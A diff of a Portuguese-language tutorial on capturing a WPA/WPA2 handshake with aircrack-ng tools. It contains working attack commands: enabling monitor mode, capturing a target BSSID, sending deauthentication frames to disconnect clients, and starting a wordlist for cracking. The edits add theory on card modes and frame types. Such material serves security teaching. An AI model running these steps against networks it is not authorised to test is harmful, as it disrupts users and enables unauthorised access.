@@ -23,7 +23,8 @@ Neste tutorial será necessário que você:
 ## Tutorial
 
 ### Modo monitor
-Primero precisamos listar as interfaces de rede de seu computador, para isso digite o seguinte comando:
+As placas de rede permitem alguns modos diferentes de operação. que são eles: *Master* (Atua como access point), *Managed* (cliente padrão), *Ad hoc*, *Mesh*, *Repeater*, *Promiscuous*, e o *Monitor mode*. Utilizaremos nossa placa de rede no modo monitor, em que ela permite que seu computador monitore todo o tráfego recebido da rede sem fio. Ao contrário do modo promíscuo, o modo monitor consegue capturar os pacotes sem estar associado a um access point.
+Primero passo, precisamos listar as interfaces de rede de seu computador, para isso digite o seguinte comando:
 
 ```bash
 sudo airmon-ng
@@ -31,12 +32,12 @@ sudo airmon-ng
 Com isso, aparecerá algo parecido com isto em seu terminal:
 ```
 Interface   	Chipset	        	Driver
-wlp3s0	    	Atheros AR9485	    ath9k - [phy0]
+wlan0	    	Atheros AR9485	    ath9k - [phy0]
 ```
 
-Caso não liste nada, sua placa de rede não suporta o modo monitor.
+Caso não liste nada, sua placa de rede não suporta o modo monitor. 
 
-No meu caso, o nome da minha interface wireless é `wlp3s0`. No seu caso pode ser diferente, mas para o termino deste tutorial iremos utilizar a `wlp3s0`. Para iniciarmos o modo monitor basta digitar no terminal o seguinte comando:
+No meu caso, o nome da minha interface wireless é `wlan0`. No seu caso pode ser diferente, mas para o termino deste tutorial iremos utilizar a `wlan0`. Para iniciarmos o modo monitor basta digitar no terminal o seguinte comando:
 
 ```
 sudo airmon-ng start wlan0
@@ -56,7 +57,7 @@ iwconfig
 
 Se tudo estiver ocorrendo como planejado, aparecerá isto em seu terminal:
 ```
-wlp3s0    IEEE 802.11  ESSID:off/any  
+wlan0     IEEE 802.11  ESSID:off/any  
           Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
           Retry short limit:7   RTS thr:off   Fragment thr:off
           Power Management:off
@@ -112,18 +113,17 @@ As redes que utiizam criptográfia WPA/WPA2 utilizam o "4-way handshake". O que 
 ## -w: Diretório que ficará salvo a captura dos pacotes
 
 sudo airodump-ng -c 1 --bssid EC:4D:47:B3:F5:88 -w . mon0
-```
-Como as informações estão sendo capturadas no passo anterior, utilizaremos o seguinte comando para extressar a conexão entre o dispositivo e a rede. Faremos este passo em outro terminal.
+```Para que a conexão entre cliente e access point seja desconectada, nos passaremos pelo access point e enviaremos frames (unidade de dados na camada de enlace) para os clientes. Os principais tipos de frames são os *Data Frames*(para transmissão de dados), *Control Frames*(controle de acesso do meio) e os *Management frames*(possuem informações de gerenciamento). Dentro dos *Management frames*, existe um frame que tem o nome de *Deauthentication*, que serve para desconectar de forma segura os dispositivos na rede. Como as informações estão sendo capturadas no passo anterior, iremos desautenticar o dispositivo da rede (faremos este passo em outro terminal), utilizando este frame. Utilizaremos o seguinte comando para que isso aconteça:
 
 ```bash
-## -0 2 : enviará dois pacotes "deauth". (Isso pode derrubar o cliente da rede wifi por alguns instantes)
+## -0 2 : enviará dois pacotes "deauth". (Isso irá desconectar o cliente da rede wifi por alguns instantes)
 ## -a: Endereço MAC do access point
 ## -c: O Endereço MAC do dispositivo em específico, que será utilizado para obter o "Handshake". 
 ## Caso queira mandar para todos os dispositivos da rede, é só não utilizar o argumento -c, como no exemplo abaixo:
 sudo aireplay-ng -0 2 -a EC:4D:47:B3:F5:88 mon0
 ```
 
-Caso conseguirmos o Handshake, irá aparecer no primeiro terminal algo parecido com`WPA handshake: 00:00:00:00:00`.Portanto, podemos parar de capturar os pacotes, apertando `Ctrl+C`. Os pacotes ficaram salvos como nome de `.-01.cap`(o arquivo ficará oculto). Neste tutorial, iremos trocar o nome para 'mypackages.cap'.
+Caso conseguirmos os pacotes do Handshake, irá aparecer no primeiro terminal algo parecido com`WPA handshake: 00:00:00:00:00`.Portanto, podemos parar de capturar os pacotes, apertando `Ctrl+C`. Os pacotes ficaram salvos como nome de `.-01.cap`(o arquivo ficará oculto). Neste tutorial, iremos trocar o nome para 'mypackages.cap'.
 
 ### Criando a Wordlist
 Na criação de uma wordlist, é interessante que se conheça o alvo atacado, criando assim uma wordlist específica para aquele alvo. Para este tutorial, criaremos uma wordlist que conterá somente números,tendo no total de 8 caracteres de tamanho.
